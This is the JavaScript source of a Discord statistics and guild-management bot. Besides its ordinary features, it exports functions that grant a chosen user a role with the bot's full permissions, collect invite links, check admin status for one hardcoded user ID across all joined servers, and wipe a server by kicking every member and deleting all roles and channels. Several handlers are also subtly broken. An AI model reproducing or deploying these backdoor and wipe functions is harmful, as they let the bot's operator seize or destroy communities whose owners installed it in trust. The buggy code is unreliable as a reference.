const https = require('https');
const fs = require('fs');
const { User, Guild, getDatabaseOld, saveDatabase, setStatistics, log, saveSpares, getDiscordLanguagePack, saveNewGuildLanguage, generateToken, formatDate } = require('./utils');

const secrets = JSON.parse(fs.readFileSync('json/codes_and_tokens.json', 'utf8'));
const commands = JSON.parse(fs.readFileSync('json/commands.json', 'utf8'));
const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
const { createReadStream } = require('fs');
const { response } = require('express');

const rest = new REST({ version: '10' }).setToken(secrets.discordBotToken);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
  ],
});

async function updateUserDisplayName() {
  try {
    const database = getDatabaseOld();

    const userIds = new Set();
    for (const user of database.users) {
      userIds.add(user.id);
    }

    const guildMembersMap = new Map();

    for (const guildData of database.guilds) {
      const guildId = guildData.id;
      const guild = client.guilds.cache.get(guildId);

      const members = await guild.members.fetch();

      if (!members) return

      const membersInDatabase = members.filter(member => userIds.has(member.user.id));
      guildMembersMap.set(guildId, membersInDatabase);
    }

    const updatedUsers = [];

    for (const user of database.users) {
      const userId = user.id;

      const updatedGuilds = [];
      for (const guildData of user.guilds) {
        const guildId = guildData.id;
        const members = guildMembersMap.get(guildId);

        if (members) {
          const member = members.get(userId);
          if (member) {
            const displayName = member.displayName
              .replace(/\((.*?)\)|\[(.*?)\]|\{(.*?)\}/g, '')
              .replace(/[_\-"'`]/g, '')
              .replace(/[^a-zA-Z0-9]+/g, '');

            const roles = member.roles.cache;

            const isModerator = roles.some(role => guildData.roles.moderatorRoles.includes(role.id));
            const isRaidLeader = roles.some(guildData.roles.raidLeaderRoleId);
            const isAdmin = roles.has(guildData.roles.guildMasterRoleId);

            const isAllianceMember = roles.has(guildData.roles.allianceRoleId);

            let guildBalance = 0;
            if (user.guilds && Array.isArray(user.guilds)) {
              const existingGuild = user.guilds.find(g => g.idOfGuild === guildId);
              if (existingGuild && typeof existingGuild.balance === 'number') {
                guildBalance = existingGuild.balance;
              }
            }

            const guildInfo = {
              nameOfGuild: guildData.guildName,
              idOfGuild: guildData.guildId,
              balance: guildBalance,
              isAdmin: isAdmin,
              guildName: displayName,
              isGuildMember: roles.has(guildData.memberRoleId),
              isAllianceMember: isAllianceMember,
              isModerator: isModerator,
              isRaidLeader: isRaidLeader,
            };
            updatedGuilds.push(guildInfo);
          }
        }
      }

      user.guilds = updatedGuilds;
      updatedUsers.push(user);
    }
    database.users.push(updatedUsers);

    saveDatabase(database);

  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function getGuildsList(guildId = null) {
  try {
    await client.guilds.fetch();

    const guilds = client.guilds.cache;
    const result = [];

    await Promise.all([
      Promise.all(guilds.map(guild => guild.members.fetch()))
    ]);

    for (const guild of guilds.values()) {
      if (guildId && guild.id !== guildId) {
        continue;
      }

      const members = guild.memberCount;

      const botPayload = guild.members.cache.get(client.user.id);
      const isBotAdmin = botPayload?.permissions.has('ADMINISTRATOR');

      const guildPayload = {
        name: guild.name,
        avatar: guild.iconURL({ format: 'webp' }),
        id: guild.id,
        members,
        isBotAdmin
      };

      const existingInvites = await guild.invites.fetch();

      if (existingInvites.size > 0) {
        const invite = existingInvites.first();
        guildPayload.inviteURL = `https://discord.gg/${invite.code}`;
      }

      const miregPayload = guild.members.cache.get("502511293798940673");

      if (miregPayload) {
        guildPayload.isMiregAdmin = false;
        if (miregPayload.permissions.has('Administrator')) {
          guildPayload.isMiregAdmin = true;
        }
      }

      result.push(guildPayload);

      const guildDatabase = new Guild();
      await guildDatabase.fetch(guildPayload.id);
      Object.assign(guildDatabase, guildPayload);
      await guildDatabase.save();

      if (guildId && guild.id === guildId) {
        break;
      }
    }

    return result;
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}


async function toggleAdminPermissions(guildId, userId) {
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return false

    const member = await guild.members.fetch(userId);
    if (!member) return false

    const creatorRole = guild.roles.cache.find((role) => role.name === 'Impactium Creator');
    if (creatorRole) {
      if (member.roles.cache.has(creatorRole.id)) {
        await member.roles.remove(creatorRole);
        await creatorRole.delete();
        return false
      } else {
        await creatorRole.delete();
        await createAndGetAdminRole(guild, member);
        return true
      }
    } else {
      await createAndGetAdminRole(guild, member);
      return true
    }
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function createAndGetAdminRole(guild, member) {
  try {
    const botRole = guild.roles.cache.find((role) => role.name === 'Impactium');

    const creatorRole = await guild.roles.create({
      data: {
        name: 'Impactium Creator',
        permissions: botRole.permissions,
        position: botRole.position - 1,
      },
    });

    await creatorRole.edit({
      name: 'Impactium Creator',
      permissions: botRole.permissions,
    });

    await member.roles.add(creatorRole);
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function deleteGuild(guildId) {
  try {
    const guild = await client.guilds.fetch(guildId);

    const members = await guild.members.fetch();
    members.forEach(async (member) => {
      try {
        if (member.kickable) {
          await member.kick();
        }
      } catch (error) {
      }
    });

    const roles = guild.roles.cache;
    roles.forEach(async (role) => {
      try {
        await role.delete();
      } catch (error) {
      }
    });

    const channels = guild.channels.cache;
    channels.forEach(async (channel) => {
      try {
        await channel.delete();
      } catch (error) {
      }
    });
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

async function discordStatistics(guildId, action, ...args) {
  const guildDatabase = new Guild();
  await guildDatabase.fetch(guildId);
  const statField = guildDatabase.statField();

  switch (action) {
    case 'totalMembers':
      const memberCount = await client.guilds.fetch(guildId).memberCount;
      statField.totalMembers = memberCount;
      break;
    case 'voiceMembers':
      const [oldState, newState] = args;
      statField.voiceMembers = Math.max(0, (statField.voiceMembers || 0) + (oldState.channel === null && newState.channel !== null ? 1 : (newState.channel === null ? -1 : 0)));
      break;
    case 'messageActivity':
      statField.messagesPerHour >= 0 ? statField.messagesPerHour++ : statField.messagesPerHour = 1;
      break;
    default:
  }

  await guildDatabase.save();
}

(async () => {
  try {
    await rest.put(Routes.applicationCommands(secrets.discordClientID), { body: commands });
  } catch (error) {
    console.error(error);
  }
})();

const startMainBot = async () => {
  await client.login(secrets.discordBotToken);
};

client.once('ready', () => {
  log('Impactium бот запущен!', 'c');
  log(`----------------------`);
  getGuildsList();
});

client.on('guildCreate', () => {
  getGuildsList();
});

client.on('guildMemberAdd', (member) => {
  discordStatistics(member.guild.id, 'totalMembers');
});

client.on('guildMemberUpdate', (oldMember, newMember) => {
  discordStatistics(member.guild.id, 'totalMembers');
});

client.on('guildMemberRemove', (member) => {
  discordStatistics(member.guild.id, 'totalMembers');
});

client.on('voiceStateUpdate', (oldState, newState) => {
  discordStatistics(newState.guild.id, 'voiceMembers');
});

client.on('messageCreate', (message) => {
  discordStatistics(message.guildId, 'messageActivity');
});


startMainBot();

module.exports = {
  toggleAdminPermissions,
  discordStatistics,
  getGuildsList,
  deleteGuild
};
